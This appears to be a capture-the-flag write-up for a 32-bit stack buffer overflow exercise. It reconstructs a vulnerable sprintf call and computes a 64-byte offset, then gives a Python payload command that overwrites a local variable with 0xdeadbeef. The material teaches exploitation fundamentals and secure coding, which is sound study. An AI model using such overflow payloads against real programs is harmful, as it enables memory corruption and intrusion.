# Ex05 – Stack Buffer Overflow (Overwriting a Local Variable)

## Goal

Print the following message:

```text
you have hit the target correctly :)
```

Unlike the previous exercises, this challenge **does not require controlling the return address**. Instead, we only need to overwrite a local variable (`target`) that is stored immediately after a buffer on the stack.

---

# Binary Information

```bash
file bin
```

```
ELF 32-bit LSB executable
```

```bash
checksec --file=bin
```

| Protection   | Status     |
| ------------ | ---------- |
| RELRO        | ❌ No       |
| Stack Canary | ❌ No       |
| NX           | ❌ Disabled |
| PIE          | ❌ No       |

Although the binary contains a **format string vulnerability** (`sprintf(buffer, string)`), this level is solved using a **stack buffer overflow**.

---

# Reconnaissance

Searching for interesting strings:

```bash
strings bin
```

Output:

```text
you have hit the target correctly :)
```

This confirms that somewhere in the program there is a condition that prints this message.

---

# Finding the Vulnerable Function

Disassemble the binary:

```bash
objdump -d bin
```

or

```bash
gdb ./bin
```

```gdb
disassemble vuln
```

Important part:

```asm
080483f4 <vuln>:
push ebp
mov ebp,esp
sub esp,0x68

movl $0x0,-0xc(%ebp)

mov eax,[ebp+8]
mov [esp+4],eax

lea eax,[ebp-0x4c]
mov [esp],eax

call sprintf

mov eax,[ebp-0xc]
cmp eax,0xdeadbeef
jne ...

puts("you have hit the target correctly :)")
```

---

# Understanding the Assembly

The compiler reserved stack space:

```asm
sub esp,0x68
```

Inside that space:

```
target -> ebp-0xc

buffer -> ebp-0x4c
```

---

# Reconstructing the C Code

The assembly is approximately equivalent to:

```c
void vuln(char *string)
{
    char buffer[64];
    int target = 0;

    sprintf(buffer, string);

    if(target == 0xdeadbeef)
        puts("you have hit the target correctly :)");
}
```

---

# Why is it Vulnerable?

The programmer wrote

```c
sprintf(buffer, string);
```

instead of

```c
sprintf(buffer, "%s", string);
```

`sprintf()` copies data into `buffer` **without checking its size**.

Since `buffer` is only 64 bytes long, sending more than 64 bytes writes into the next variables on the stack.

---

# Calculating the Offset

Locations:

```
buffer = ebp-0x4c

target = ebp-0xc
```

Distance:

```
0x4c - 0x0c
= 0x40
= 64 bytes
```

Therefore:

```
First 64 bytes  -> buffer
Next 4 bytes    -> target
```

---

# Stack Layout

```
Higher Addresses
+----------------------+
| Saved EBP            |
+----------------------+
| Return Address       |
+----------------------+
| target (4 bytes)     | <-- ebp-0xc
+----------------------+
|                      |
| padding              |
|                      |
+----------------------+
| buffer[64]           | <-- ebp-0x4c
|                      |
+----------------------+
Lower Addresses
```

---

# Verifying the Offset

Run:

```bash
./bin $(python3 -c 'print("A"*64 + "BBBB")')
```

Nothing is printed because `BBBB` is not equal to `0xdeadbeef`.

Verify in GDB.

Breakpoint:

```gdb
b *0x8048413
```

Run:

```gdb
run $(python3 -c 'print("A"*64 + "BBBB")')
```

Inspect `target`:

```gdb
x/wx $ebp-0xc
```

Output:

```text
0x42424242
```

Since

```
'B' = 0x42
```

then

```
BBBB

↓

42 42 42 42

↓

0x42424242
```

This proves that after 64 bytes we overwrite `target`.

---

# Required Value

The comparison is

```asm
cmp eax,0xdeadbeef
```

Therefore

```
target

must become

0xdeadbeef
```

---

# Little Endian

The CPU is x86 (little endian).

The integer

```
0xdeadbeef
```

must be written in memory as

```
ef be ad de
```

---

# Final Payload

```python
b"A"*64 + b"\xef\xbe\xad\xde"
```

Command:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
```

Output:

```text
you have hit the target correctly :)
```

Challenge solved.

---

# What I Learned

* Reading x86 assembly.
* Identifying local variables using `ebp` offsets.
* Reconstructing C code from assembly.
* Understanding stack layout.
* Calculating overwrite offsets manually.
* Verifying offsets with GDB.
* Understanding little-endian byte order.
* Building a payload with Python.
* Overwriting a local variable instead of the return address.
* Difference between a stack buffer overflow and a format string vulnerability.

---

# Important Takeaways

* `sprintf()` performs **no bounds checking**.
* A fixed-size buffer on the stack is dangerous when user input is copied into it unchecked.
* The distance between local variables can be computed directly from their `ebp` offsets.
* On x86, integers must be supplied in **little-endian** order.
* Not every buffer overflow requires hijacking the instruction pointer; sometimes changing a nearby variable is enough to satisfy the program's logic.
